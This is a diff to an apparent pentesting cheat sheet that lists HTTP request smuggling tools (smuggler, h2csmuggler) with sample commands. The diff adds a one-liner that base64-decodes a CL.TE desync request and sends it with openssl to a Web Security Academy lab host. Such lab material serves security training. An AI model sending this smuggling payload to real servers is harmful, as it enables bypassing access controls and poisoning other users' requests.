@@ -497,6 +497,9 @@ https://github.com/defparam/smuggler
 <br># An HTTP Request Smuggling / Desync testing tool written in Python 3.
 <br>```python3 smuggler.py -q -u https://example.com/```
 
+<br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.
+<br>```echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &>/dev/null```
+
 https://github.com/BishopFox/h2csmuggler
 <br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.
 <br>```h2csmuggler.py -x https://example.com/ --test```
